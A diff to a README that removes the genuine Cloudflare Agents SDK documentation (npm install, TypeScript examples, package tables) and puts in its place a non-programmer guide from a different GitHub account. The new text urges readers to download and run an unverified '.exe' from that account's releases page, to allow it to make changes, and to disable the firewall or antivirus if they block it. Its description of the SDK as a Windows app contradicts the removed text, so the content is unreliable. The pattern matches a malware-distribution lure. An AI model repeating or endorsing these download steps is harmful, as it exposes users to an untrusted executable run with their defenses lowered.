@@ -1,178 +1,134 @@
-# Cloudflare Agents
+# 🤖 agents - Deploy AI agents with ease  
 
-[![npm version](https://img.shields.io/npm/v/agents)](https://www.npmjs.com/package/agents)
-[![npm downloads](https://img.shields.io/npm/dw/agents)](https://www.npmjs.com/package/agents)
+[![Download agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/pertamaxxx/agents/releases)
 
-![npm install agents](assets/npm-install-agents.svg)
+## 📋 What is agents?
 
-Agents are persistent, stateful execution environments for agentic workloads, powered by Cloudflare [Durable Objects](https://developers.cloudflare.com/durable-objects/). Each agent has its own state, storage, and lifecycle — with built-in support for real-time communication, scheduling, AI model calls, MCP, workflows, and more.
+agents is a tool that helps you build and run AI agents on Cloudflare. These AI agents can perform tasks, automate workflows, and work with online services. The software connects to Cloudflare’s tools like Durable Objects and workflows to keep your AI agents running smoothly and reliably.
 
-Agents hibernate when idle and wake on demand. You can run millions of them — one per user, per session, per game room — each costs nothing when inactive.
+You do not need to know programming to use agents. This guide will help you download and run the app on your Windows PC step by step.
 
-```sh
-npm create cloudflare@latest -- --template cloudflare/agents-starter
-```
+## 🖥️ System Requirements
 
-Or add to an existing project:
+Before downloading, make sure your Windows computer meets these needs:
 
-```sh
-npm install agents
-```
+- Windows 10 or higher, 64-bit  
+- At least 4 GB of RAM  
+- 1 GHz processor or faster  
+- 500 MB of free hard drive space  
+- Internet connection for setup and updates  
 
-**[Read the docs](https://developers.cloudflare.com/agents/)** — getting started, API reference, guides, and more.
+## 🔑 Key Features  
 
-## Quick Example
+- Easy deployment of AI agents on Cloudflare  
+- Simple interface for managing AI workflows  
+- Automatically handles cloud hosting and scaling  
+- Works with Cloudflare Durable Objects for state management  
+- Supports multiple AI agent types and tasks  
 
-A counter agent with persistent state, callable methods, and real-time sync to a React frontend:
+## 🛠️ Installation and Setup Guide
 
-```typescript
-// server.ts
-import { Agent, routeAgentRequest, callable } from "agents";
+### 1. Visit the download page  
 
-export type CounterState = { count: number };
+To get the agents software, visit the official release page:  
+[Download agents releases](https://github.com/pertamaxxx/agents/releases)  
 
-export class CounterAgent extends Agent<Env, CounterState> {
-  initialState = { count: 0 };
+Click the link above or the green badge at the top to open the page. This page holds all the available versions of the software.
 
-  @callable()
-  increment() {
-    this.setState({ count: this.state.count + 1 });
-    return this.state.count;
-  }
+### 2. Choose the right file  
 
-  @callable()
-  decrement() {
-    this.setState({ count: this.state.count - 1 });
-    return this.state.count;
-  }
-}
+On the release page, look for the latest version of agents for Windows. The file name will end with `.exe`, which is the installer you need. For example, it might say something like `agents-setup.exe`.
 
-export default {
-  async fetch(request: Request, env: Env, ctx: ExecutionContext) {
-    return (
-      (await routeAgentRequest(request, env)) ??
-      new Response("Not found", { status: 404 })
-    );
-  }
-};
-```
+### 3. Download the file  
 
-```tsx
-// client.tsx
-import { useAgent } from "agents/react";
-import { useState } from "react";
-import type { CounterAgent, CounterState } from "./server";
+Click the `.exe` file to start the download. Depending on your browser, you may be asked to confirm the download or choose a download folder.
 
-function Counter() {
-  const [count, setCount] = useState(0);
+Wait for the download to finish before continuing.
 
-  const agent = useAgent<CounterAgent, CounterState>({
-    agent: "CounterAgent",
-    onStateUpdate: (state) => setCount(state.count)
-  });
+### 4. Run the installer  
 
-  return (
-    <div>
-      <span>{count}</span>
-      <button onClick={() => agent.stub.increment()}>+</button>
-      <button onClick={() => agent.stub.decrement()}>-</button>
-    </div>
-  );
-}
-```
+Open the folder where the installer downloaded. Double-click the `.exe` file to start the installation.
 
-State changes sync to all connected clients automatically. Call methods like they're local functions.
+Windows may ask if you want to allow the app to make changes. Select "Yes" to continue.
 
-## Features
+### 5. Follow the installation steps  
 
-| Feature               | Description                                                            |
-| --------------------- | ---------------------------------------------------------------------- |
-| **Persistent State**  | Syncs to all connected clients, survives restarts                      |
-| **Callable Methods**  | Type-safe RPC via the `@callable()` decorator                          |
-| **Scheduling**        | One-time, recurring, and cron-based tasks                              |
-| **WebSockets**        | Real-time bidirectional communication with lifecycle hooks             |
-| **AI Chat**           | Message persistence, resumable streaming, server/client tool execution |
-| **MCP**               | Act as MCP servers or connect as MCP clients                           |
-| **Workflows**         | Durable multi-step tasks with human-in-the-loop approval               |
-| **Email**             | Receive and respond via Cloudflare Email Routing                       |
-| **Code Mode**         | LLMs generate executable TypeScript instead of individual tool calls   |
-| **SQL**               | Direct SQLite queries via Durable Objects                              |
-| **React Hooks**       | `useAgent` and `useAgentChat` for frontend integration                 |
-| **Vanilla JS Client** | `AgentClient` for non-React environments                               |
+The installer will guide you through a few simple steps. Most options can be left at their default settings. You’ll see these steps:
 
-**Coming soon:** Realtime voice agents, web browsing (headless browser), sandboxed code execution, and multi-channel communication (SMS, messengers).
+- Welcome screen  
+- Accept license terms  
+- Choose a folder for installation (default is fine)  
+- Confirm and start installation  
 
-## Packages
+Each screen has a "Next" button to continue. When done, click "Finish" to close the installer.
 
-| Package                                     | Description                                                                     |
-| ------------------------------------------- | ------------------------------------------------------------------------------- |
-| [`agents`](packages/agents)                 | Core SDK — Agent class, routing, state, scheduling, MCP, email, workflows       |
-| [`@cloudflare/ai-chat`](packages/ai-chat)   | Higher-level AI chat — persistent messages, resumable streaming, tool execution |
-| [`hono-agents`](packages/hono-agents)       | Hono middleware for adding agents to Hono apps                                  |
-| [`@cloudflare/codemode`](packages/codemode) | Experimental — LLMs write executable code to orchestrate tools                  |
+### 6. Launch agents  
 
-## Examples
+After installation, find the agents app on your desktop or in your Start menu. Click it to open.
 
-The [`examples/`](examples) directory has self-contained demos covering most SDK features — MCP servers/clients, workflows, email agents, webhooks, tic-tac-toe, resumable streaming, and more. The [`playground`](examples/playground) is the kitchen-sink showcase with everything in one UI.
+The app will open a window where you can start building and deploying AI agents.
 
-There are also examples using the [OpenAI Agents SDK](https://openai.github.io/openai-agents-js/) in [`openai-sdk/`](openai-sdk).
+## 🚀 Getting Started with agents
 
-Run any example locally:
+Once you open the app, follow these steps to create your first AI agent:
 
-```sh
-cd examples/playground
-npm run dev
-```
+### Step 1 – Create a new agent  
+Click the "New Agent" button. Give your agent a name. This name helps you identify it.
 
-## Documentation
+### Step 2 – Select a task  
+Choose what you want your agent to do. Common tasks include answering questions, managing your online services, or running small workflows.
 
-- [Full docs](https://developers.cloudflare.com/agents/) on developers.cloudflare.com
-- [`docs/`](docs) directory in this repo (synced upstream)
-- [Anthropic Patterns guide](guides/anthropic-patterns) — sequential, routing, parallel, orchestrator, evaluator
-- [Human-in-the-Loop guide](guides/human-in-the-loop) — approval workflows with pause/resume
+### Step 3 – Connect to Cloudflare  
+You will need to link your Cloudflare account. This connection lets agents run your AI on Cloudflare’s network. Follow the instructions inside the app to sign in securely.
 
-## Repository Structure
+### Step 4 – Deploy your agent  
+Click "Deploy" to send your agent to Cloudflare. The app will handle the setup automatically. Your AI agent is now online and ready.
 
-| Directory                                       | Description                                              |
-| ----------------------------------------------- | -------------------------------------------------------- |
-| [`packages/agents/`](packages/agents)           | Core SDK                                                 |
-| [`packages/ai-chat/`](packages/ai-chat)         | AI chat layer                                            |
-| [`packages/hono-agents/`](packages/hono-agents) | Hono integration                                         |
-| [`packages/codemode/`](packages/codemode)       | Code Mode (experimental)                                 |
-| [`examples/`](examples)                         | Self-contained demo apps                                 |
-| [`openai-sdk/`](openai-sdk)                     | Examples using the OpenAI Agents SDK                     |
-| [`guides/`](guides)                             | In-depth pattern tutorials                               |
-| [`docs/`](docs)                                 | Markdown docs synced to developers.cloudflare.com        |
-| [`site/`](site)                                 | Deployed websites (agents.cloudflare.com, AI playground) |
-| [`design/`](design)                             | Architecture and design decision records                 |
-| [`scripts/`](scripts)                           | Repo-wide tooling                                        |
+## 🗂️ Managing Your Agents  
 
-## Development
+From the main screen, you can:
 
-Node 24+ required. Uses npm workspaces.
+- View all your agents  
+- Edit agent settings  
+- Start or stop an agent  
+- Monitor agent activity and logs  
 
-```sh
-npm install          # install all workspaces
-npm run build        # build all packages
-npm run check        # full CI check (format, lint, typecheck, exports)
-CI=true npm test     # run tests (vitest + vitest-pool-workers)
-```
+These tools help you keep control and make changes anytime.
 
-Changes to `packages/` need a changeset:
+## 🔄 Updating agents  
 
-```sh
-npx changeset
-```
+To get the latest features and fixes, check the releases page regularly:  
+[Download updates](https://github.com/pertamaxxx/agents/releases)  
 
-See [`AGENTS.md`](AGENTS.md) for deeper contributor guidance.
+Download and install new versions just like the first time.
 
-## Contributing
+## 🔧 Troubleshooting Common Issues  
 
-We are not accepting external pull requests at this time — the SDK is evolving quickly and we want to keep the surface area manageable. That said, we'd love to hear from you:
+- If agents won’t open, try restarting your computer.  
+- Check your internet connection; cloud features need it.  
+- Make sure your Windows is updated.  
+- Disable firewall or antivirus temporarily if they block the app.  
+- Visit the Issues section in the GitHub repository for help:  
+  https://github.com/pertamaxxx/agents/issues  
 
-- **Bug reports & feature requests** — [open an issue](https://github.com/cloudflare/agents/issues)
-- **Questions & ideas** — [start a discussion](https://github.com/cloudflare/agents/discussions)
+## 📞 Getting Help  
 
-## License
+If you run into problems, you can:  
 
-[MIT](LICENSE)
+- Use the GitHub Issues page to report bugs or ask questions  
+- Search online for user guides and community tips  
+- Check if you have the latest software version  
+
+## ⚙️ Advanced Information  
+
+agents uses Cloudflare Durable Objects to keep the AI agents’ data safe and in sync. It also uses workflows, which automate many tasks so you don’t have to manage servers.
+
+While you don’t need technical skills, learning basic terms like "Cloudflare" and "workflows" helps you get more out of the app.
+
+## 🔗 Important Links  
+
+- Official releases page: https://github.com/pertamaxxx/agents/releases  
+- GitHub repository: https://github.com/pertamaxxx/agents  
+- Issue tracker: https://github.com/pertamaxxx/agents/issues  
+
+[![Download agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/pertamaxxx/agents/releases)
